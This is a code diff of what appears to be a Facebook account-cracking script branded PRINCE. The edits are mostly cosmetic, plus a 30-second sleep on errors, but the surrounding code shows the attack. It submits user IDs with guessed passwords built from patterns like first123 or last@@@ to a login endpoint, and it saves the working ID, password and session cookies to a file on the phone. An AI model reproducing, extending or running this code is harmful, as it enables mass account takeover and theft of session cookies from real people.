@@ -355,7 +355,7 @@ class sort:
 
     @staticmethod
     def logo():
-        aci = f'''    //   ) )                                      
+        aci = f'''        //   ) )                                      
        //___/ /  __     ( )   __      ___      ___    
       / ____ / //  ) ) / / //   ) ) //   ) ) //___) ) 
      //       //      / / //   / / //       //        
@@ -478,13 +478,13 @@ def file_sub(uid, pwx, name, meth, fl):
             rq = requests.post(url, data=data, headers=head, allow_redirects=False, verify=certifi.where()).json()
             if "session_key" in rq:
                 coki = ";".join(i["name"] + "=" + i["value"] for i in rq["session_cookies"])
-                print(f"\r\r[b r green_yellow][PRINCE-OK][/b r green_yellow][b chartreuse1]{uid}|{ps}\n")
+                print(f"\r\r[b r green_yellow][PRINCE-OK][/b r green_yellow][b chartreuse1]{uid}|{ps}")
                 open("/sdcard/PRINCEFILE-OK.txt", "a").write(uid + "|" + ps + "|" + coki + "\n")
                 oks.append(uid)
 
                 break
             elif "Please Confirm Email" in str(rq):
-                print(f"\r\r[b r green_yellow][PRINCE-OK][/b r green_yellow][b chartreuse1]{uid}|{ps}\n")
+                print(f"\r\r[b r green_yellow][PRINCE-OK][/b r green_yellow][b chartreuse1]{uid}|{ps}")
                 open("/sdcard/PRINCEFILE-OK.txt", "a").write(uid + "|" + ps + "|" + "\n")
                 oks.append(uid)
 
@@ -492,7 +492,7 @@ def file_sub(uid, pwx, name, meth, fl):
             else:
                 continue
     except Exception as e:
-        pass
+        time.sleep(30)
     finally:
         loop += 1
 
@@ -514,12 +514,12 @@ def filee():
     except Exception as e:
         print("Error:", e)
         filee()
-    limit = input("[b]    [red1]✗ [chartreuse1] [spring_green1]Password Limit -> ")
+    limit = input("Password Limit -> ")
     print(sort.line())
     for i in range(int(limit)):
         print(
             " [b] [chartreuse1]TYPE PASSWORD. EXAMPLE      [b deep_pink2]->[/b deep_pink2]  [chartreuse1] first123, First123, last123, last@@@")
-        passw = str(input(" \x1b[38;1;198m Π \x1b[38;5;155mAdd Pass    \x1b[38;5;196m⟩ \x1b[1;97m   "))
+        passw = str(input(f" \x1b[38;1;198m  \x1b[38;5;155mPass No-{i+1} Add Pass    \x1b[38;5;196m⟩ \x1b[1;97m   "))
         if passw not in pwx:
             pwx.append(passw)
         print(sort.line())
@@ -538,7 +538,7 @@ def filee():
         sort.clear()
         print(sort.logo())
         print(
-            f"  [r dark_sea_green1]Π![/r dark_sea_green1] [light_green]Total Pas[b red1]  ⟩ [/b red1]  [light_green] +{str(len(pwx))}")
+            f"  [r dark_sea_green1]Π![/r dark_sea_green1] [light_green]Total Pas[b red1]  ⟩ [/b red1]  [light_green] {str(len(pwx))}")
         print(sort.line())
         try:
             for xd in fl:
